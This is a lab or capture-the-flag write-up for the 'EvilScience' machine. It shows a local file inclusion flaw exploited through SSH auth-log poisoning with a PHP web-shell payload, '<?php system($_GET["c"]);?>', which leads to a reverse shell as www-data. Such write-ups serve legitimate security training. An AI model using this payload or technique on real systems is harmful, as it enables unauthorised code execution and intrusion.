# The Ether: EvilScience (v1.0.1) Writeup

First , we run a network scan
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.111.157.53   f6:b6:81:a5:a1:8e      1      60  Unknown vendor                                                                                                                                                 
 10.111.157.58   d8:a8:81:42:0c:eb      1      60  Unknown vendor                                                                                                                                                 
 10.111.157.139  00:0c:29:30:38:ee      1      60  VMware, Inc.
```
\
Next, Open Ports scanning
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
After accessing port 80 on browser , i checked source code and i found
```bash
div class="wrapper row2">
  <nav id="mainav" class="hoc clear"> 
    <!-- ################################################################################################ -->
    <ul class="clear">
      <li class="active"><a href="index.php">Home</a></li>
      <li><a href="?file=about.php">About Us</a></li>
      <li><a href="?file=research.php">Research</a></li>
    </ul>
    <!-- ################################################################################################ -->
  </nav>
```
\
So we can see that there is a LFI vulnerability here
\
After bruteforcing a bit for LFI checking , i found this file '/var/log/auth.log'
\
So i thought about PHP Log Poisoning , So to check i tried a wrong password for ssh
```bash
ssh root@10.111.157.139                                      
The authenticity of host '10.111.157.139 (10.111.157.139)' can't be established.
ED25519 key fingerprint is SHA256:A2ppLqZIgajFCD6dE0G+eokJmp5p1hlXEFb2V1v+fng.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:61: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.111.157.139' (ED25519) to the list of known hosts.
root@10.111.157.139's password: 
Permission denied, please try again.
```
\
and When i checked the log 
```bash
Jan 22 06:17:01 theEther CRON[1711]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 22 06:17:01 theEther CRON[1711]: pam_unix(cron:session): session closed for user root
Jan 22 06:21:19 theEther sshd[1748]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.111.157.14  user=root
Jan 22 06:21:21 theEther sshd[1748]: Failed password for root from 10.111.157.14 port 45960 ssh2
Jan 22 06:21:22 theEther sshd[1748]: Connection closed by 10.111.157.14 port 45960 [preauth]
```
\
We can see the log of that login attempt, So now i try to connect using telnet and use a php function instead of a username
```bash
telnet 10.111.157.139 22   
Trying 10.111.157.139...
Connected to 10.111.157.139.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
<?php system($_GET["c"]);?>
Protocol mismatch.
Connection closed by foreign host.
```
\
Now if we check the log file with a query parameter c=id, We see 
\
<img width="1365" height="515" alt="image" src="https://github.com/user-attachments/assets/dcad55ff-03ea-4d24-8261-5198126e32ea" />
\
So we successfully got code execution , So now switchign to shell
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.111.157.14
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from theEther~10.111.157.139-Linux-i686 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/theEther~10.111.157.139-Linux-i686/2026_01_22-09_27_05-643.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@theEther:/var/www/html/theEther.com/public_html$ 
```
\
